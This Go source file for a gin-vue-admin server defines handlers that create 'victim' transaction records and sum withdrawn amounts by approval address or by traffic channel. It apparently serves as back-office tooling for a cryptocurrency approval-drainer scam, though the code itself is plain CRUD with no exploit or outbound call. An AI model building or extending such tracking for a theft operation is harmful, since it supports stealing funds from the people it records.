package system

import (
	"fmt"
	"github.com/flipped-aurora/gin-vue-admin/server/global"
	"github.com/flipped-aurora/gin-vue-admin/server/model/common/response"
	"github.com/flipped-aurora/gin-vue-admin/server/model/system"
	"github.com/gin-gonic/gin"
	"go.uber.org/zap"
	"log"
)

type SystemVictimTx struct{}

// CreateApi
// @Tags      SysApi
// @Summary   创建基础api
// @Security  ApiKeyAuth
// @accept    application/json
// @Produce   application/json
// @Param     data  body      system.SysApi                  true  "api路径, api中文描述, api组, 方法"
// @Success   200   {object}  response.Response{msg=string}  "创建基础api"
// @Router    /api/createApi [post]
func (s *SystemVictimTx) CreateVictimTx(c *gin.Context) {
	var tx system.SysVictimTx
	err := c.ShouldBindJSON(&tx)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}

	err = victimTxService.CreateVictimTx(tx)
	if err != nil {
		global.GVA_LOG.Error("创建失败!", zap.Error(err))
		response.FailWithMessage("创建失败", c)
		return
	}
	response.OkWithMessage("创建成功", c)
}

func (s *SystemVictimTx) StatVictimTx(c *gin.Context) {

	log.Println("============统计============")
	var tx system.SysVictimTx
	err := c.ShouldBindJSON(&tx)
	if err != nil {
		response.FailWithMessage(err.Error(), c)
		return
	}

	var victimList []system.SysVictimTx
	if tx.ApprovalAddress != "" {
		amount, _ := victimTxService.StatByApprovalAddress(tx.ApprovalAddress)
		var victimTx system.SysVictimTx
		victimTx.ApprovalAddress = tx.ApprovalAddress
		withdrawAmount := fmt.Sprintf("%f", amount)
		victimTx.WithdrawAmount = withdrawAmount
		victimList = append(victimList, victimTx)

	} else {
		if tx.PrimaryChannel != "" {
			amount, _ := victimTxService.StatByChannel(tx.PrimaryChannel)
			var victimTx system.SysVictimTx
			victimTx.PrimaryChannel = tx.PrimaryChannel
			withdrawAmount := fmt.Sprintf("%f", amount)
			victimTx.WithdrawAmount = withdrawAmount
			victimList = append(victimList, victimTx)
		}
		if tx.PrimaryChannel == "" {
			channles, _ := victimTxService.QueryUniqueChannel()
			for _, chnl := range channles {
				amount, _ := victimTxService.StatByChannel(chnl)

				var victimTx system.SysVictimTx
				victimTx.PrimaryChannel = chnl
				withdrawAmount := fmt.Sprintf("%f", amount)
				victimTx.WithdrawAmount = withdrawAmount
				victimList = append(victimList, victimTx)

			}

		}
	}
	if err != nil {
		global.GVA_LOG.Error("获取失败!", zap.Error(err))
		response.FailWithMessage("获取失败", c)
		return
	}

	response.OkWithDetailed(response.PageResult{
		List:     victimList,
		Total:    int64(len(victimList)),
		Page:     1,
		PageSize: 1000,
	}, "获取成功", c)
}
